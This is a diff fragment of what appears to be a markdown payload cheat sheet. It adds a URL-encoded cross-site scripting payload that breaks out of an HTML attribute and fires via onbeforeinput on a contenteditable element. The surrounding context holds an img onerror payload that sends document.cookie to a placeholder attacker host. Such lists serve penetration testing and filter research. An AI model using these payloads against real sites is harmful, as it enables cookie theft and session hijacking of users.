@@ -724,6 +724,10 @@ Some applications block input containing hostnames like `127.0.0.1` and localhos
   - ```HTML
     <img src=x onerror=this.src='http://ATTACKER-WEBSITE/?'+document.cookie;>
     ```
+ - onbeforeinput + contenteditable
+   ```JavaScript
+   %22%20onbeforeinput=alert(document.cookie)%20contenteditable%20alt=%22
+   ```
 
 
 
